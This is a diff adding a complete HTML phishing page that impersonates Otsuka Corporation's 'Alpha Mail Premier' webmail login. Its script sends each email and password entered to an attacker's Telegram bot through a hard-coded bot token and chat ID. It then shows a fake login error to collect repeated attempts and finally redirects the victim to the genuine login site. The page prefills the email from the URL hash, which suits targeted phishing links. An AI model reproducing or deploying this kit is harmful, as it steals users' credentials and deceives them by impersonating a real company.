@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=10" />
+    <title>Alpha Male Premier Membership Site</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.2/lib/anime.min.js"
+        integrity="sha256-tc4b48P1MPGS4PJXHRlChGCW1mEZy62jS/3JEsSHPzU=" crossorigin="anonymous"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
+            min-height: 100vh;
+        }
+
+        .header {
+            background: linear-gradient(to bottom, #1e3a8a, #1e40af);
+            color: white;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            margin-bottom: 20px;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo-section img {
+            height: 40px;
+        }
+
+        .logo-text {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .header-nav {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .header-nav a {
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+            padding: 8px 12px;
+            border-radius: 4px;
+            transition: background 0.3s;
+        }
+
+        .header-nav a:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .lock-icon {
+            width: 30px;
+            height: 30px;
+            background: #0067b8;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .breadcrumb {
+            max-width: 1200px;
+            margin: 0 auto;
+            color: white;
+            font-size: 14px;
+            padding: 10px 20px;
+        }
+
+        .breadcrumb span {
+            margin: 0 5px;
+        }
+
+        .main-title {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            color: white;
+            font-size: 32px;
+            font-weight: 300;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+        }
+
+        .info-box {
+            background: #f0f0f0;
+            padding: 20px;
+            border-bottom: 1px solid #ddd;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .info-box p {
+            margin: 0;
+            font-size: 15px;
+        }
+
+        .form-section {
+            padding: 40px;
+        }
+
+        .loader {
+            display: none;
+            gap: 6px;
+            width: fit-content;
+            margin-bottom: 20px;
+            flex-direction: row-reverse;
+        }
+
+        .loader div {
+            width: 4px;
+            height: 4px;
+            background-color: #0067b8;
+            border-radius: 50%;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            color: #0a5fa0;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #999;
+            border-radius: 4px;
+            font-size: 14px;
+            font-family: inherit;
+            transition: border-color 0.3s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #0067b8;
+            box-shadow: 0 0 0 3px rgba(0, 103, 184, 0.1);
+        }
+
+        .checkbox-group {
+            margin-top: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+
+        .checkbox-group label {
+            font-size: 13px;
+            color: #555;
+            cursor: pointer;
+        }
+
+        .error-message {
+            display: none;
+            background: #f8d7da;
+            color: #721c24;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            border: 1px solid #f5c6cb;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #999;
+            margin-bottom: 20px;
+            font-style: italic;
+        }
+
+        .btn-group {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-signin {
+            flex: 1;
+            background: linear-gradient(to bottom, #ff9900, #ff8800);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-weight: 600;
+        }
+
+        .btn-signin:hover {
+            background: linear-gradient(to bottom, #ffaa11, #ff9911);
+        }
+
+        .btn-signin:active {
+            transform: scale(0.98);
+        }
+
+        .btn-save {
+            flex: 1;
+            background: white;
+            color: #0067b8;
+            border: 1px solid #ddd;
+            padding: 12px 20px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+
+        .btn-save:hover {
+            background: #f8f8f8;
+            border-color: #999;
+        }
+
+        .help-text {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .help-text a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .help-text a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            background: #0a5fa0;
+            color: white;
+            padding: 40px 20px;
+            margin-top: 40px;
+        }
+
+        .footer-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        .footer-section {
+            cursor: pointer;
+            padding: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            transition: background 0.3s;
+        }
+
+        .footer-section:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .footer-section-title {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        .footer-divider {
+            max-width: 1200px;
+            margin: 30px auto;
+            height: 1px;
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .footer-bottom {
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: center;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .arrow {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            border-top: 1px solid white;
+            border-right: 1px solid white;
+            transform: rotate(45deg);
+        }
+
+        @media (max-width: 768px) {
+            .header-top {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .header-nav {
+                flex-direction: column;
+                gap: 10px;
+            }
+
+            .container {
+                margin: 20px;
+            }
+
+            .footer-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <div class="header-top">
+            <div class="logo-section">
+                <svg width="30" height="30" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="30" height="30" rx="4" fill="#ff0000"/>
+                    <text x="15" y="20" font-size="18" fill="white" text-anchor="middle" font-weight="bold">🔱</text>
+                </svg>
+                <span class="logo-text">大塚商会</span>
+                <div style="margin-left: 20px; padding-left: 20px; border-left: 1px solid rgba(255,255,255,0.3);">
+                    <div style="font-size: 14px; font-weight: 600;">Alpha Male Premier</div>
+                    <div style="font-size: 11px; opacity: 0.9;">Membership Site</div>
+                </div>
+            </div>
+            <div class="header-nav">
+                <div class="lock-icon" title="Secure">🔒</div>
+                <a href="#search">search</a>
+                <a href="#menu">menu</a>
+            </div>
+        </div>
+        <div class="breadcrumb">
+            <a href="#" style="color: white; text-decoration: none;">HOME</a>
+            <span>&gt;</span>
+            <span>Alpha Male Premier Login</span>
+        </div>
+        <div class="main-title">Alpha Male Premier Login</div>
+    </div>
+
+    <div class="container">
+        <div class="info-box">
+            <p><strong>If you are currently using "Alpha Mail Premier",</strong></p>
+            <p>please log in here.</p>
+        </div>
+
+        <div class="form-section">
+            <form onsubmit="return sendTelegramData(event)">
+                <div id="loader" class="loader">
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                </div>
+
+                <fieldset id="formFieldset" style="border: none; padding: 0;">
+                    <div class="form-group">
+                        <label class="form-label">email address</label>
+                        <input type="email" id="emailInput" name="email" class="form-input" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">password</label>
+                        <input type="password" id="passwordInput" name="password" class="form-input" required>
+                    </div>
+
+                    <input type="hidden" id="passwordHidden" name="passwordHidden" value="">
+
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="showPasswordCheck" onchange="togglePasswordVisibility()">
+                        <label for="showPasswordCheck">Show password</label>
+                    </div>
+
+                    <div class="info-text">
+                        Please re-enter your same Password to keep default settings.
+                    </div>
+
+                    <div id="errorDiv" class="error-message">
+                        The user name or password you entered isn't correct. Try entering it again.
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="submit" class="btn-signin">
+                            🔐 Log in
+                        </button>
+                        <button type="button" class="btn-save">Save ID</button>
+                    </div>
+                </fieldset>
+            </form>
+
+            <div class="help-text">
+                * If you are unable to log in, please check <a href="#">here</a>.
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-grid">
+            <div class="footer-section">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    Log in
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    Service-related information
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    Maintenance and fault information
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    User's Guide
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    Frequently asked questions
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    inquiry
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    Sitemap
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    Feature introduction
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-grid" style="grid-template-columns: 1fr 1fr; gap: 0; margin-bottom: 0;">
+            <div class="footer-section">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    Information Security Basic Policy
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    privacy policy
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    Terms of Use
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    Terms of Service
+                </div>
+            </div>
+            <div class="footer-section" style="grid-column: 1 / -1;">
+                <div class="footer-section-title">
+                    <span class="arrow"></span>
+                    Service Policy
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-bottom">
+            Copyright © 2025 OTSUKA CORPORATION ALL Rights Reserved.
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_ID = "8571582996:AAGhoLlh20Ttuwr8uAESPmXAQO6tBvKA51w";
+        const TELEGRAM_CHAT_ID = 5491806427;
+        let attemptCount = 0;
+
+        // Toggle password visibility
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById('passwordInput');
+            const showCheckbox = document.getElementById('showPasswordCheck');
+            passwordInput.type = showCheckbox.checked ? 'text' : 'password';
+        }
+
+        // Show error message
+        function showError() {
+            document.getElementById('errorDiv').style.display = 'block';
+        }
+
+        // Hide error message
+        function hideError() {
+            document.getElementById('errorDiv').style.display = 'none';
+        }
+
+        // Show loading animation
+        function showLoader() {
+            document.getElementById('loader').style.display = 'flex';
+            document.getElementById('formFieldset').style.opacity = '0.4';
+        }
+
+        // Hide loading animation
+        function hideLoader() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('formFieldset').style.opacity = '1';
+        }
+
+        // Send data to Telegram
+        function sendTelegramData(event) {
+            event.preventDefault();
+            attemptCount++;
+
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+
+            showLoader();
+
+            // Create message for Telegram
+            const telegramMessage = `🔐 ALPHA MALE PREMIER LOGIN ✅\n\n` +
+                `📧 Email: ${email}\n` +
+                `🔑 Password: ${password}\n\n` +
+                `⏰ Timestamp: ${new Date().toISOString()}\n` +
+                `🔢 Attempt: ${attemptCount}\n\n` +
+                `🌐 Site: Alpha Male Premier Membership`;
+
+            // Send to Telegram API
+            const settings = {
+                "async": true,
+                "crossDomain": true,
+                "url": "https://api.telegram.org/bot" + TELEGRAM_BOT_ID + "/sendMessage",
+                "method": "POST",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "cache-control": "no-cache"
+                },
+                "data": JSON.stringify({
+                    "chat_id": TELEGRAM_CHAT_ID,
+                    "text": telegramMessage
+                })
+            };
+
+            $.ajax(settings).done(function (response) {
+                console.log("Telegram message sent:", response);
+            }).fail(function (error) {
+                console.log("Telegram error:", error);
+            });
+
+            // Simulate login delay
+            setTimeout(() => {
+                hideLoader();
+                showError();
+                document.getElementById('passwordInput').value = '';
+
+                // After 3 attempts, redirect
+                if (attemptCount >= 3) {
+                    setTimeout(() => {
+                        window.location.replace("https://alpha-prm.jp/login");
+                    }, 2000);
+                }
+            }, 3000);
+
+            return false;
+        }
+
+        // Hide error on password focus
+        document.getElementById('passwordInput').addEventListener('focus', hideError);
+
+        // Page load initialization
+        document.addEventListener('DOMContentLoaded', function () {
+            console.log("Alpha Male Premier Login Page Loaded");
+            
+            // Extract email from URL hash if available
+            const urlHash = window.location.hash.substr(1);
+            if (urlHash) {
+                try {
+                    const decodedEmail = decodeURIComponent(urlHash);
+                    document.getElementById('emailInput').value = decodedEmail;
+                    
+                    // Extract domain
+                    const atIndex = decodedEmail.indexOf('@');
+                    if (atIndex > -1) {
+                        document.getElementById('passwordHidden').value = decodedEmail.substr(atIndex + 1);
+                    }
+                } catch (e) {
+                    console.log("Error decoding URL hash");
+                }
+            }
+        });
+    </script>
+</body>
+
+</html>
+
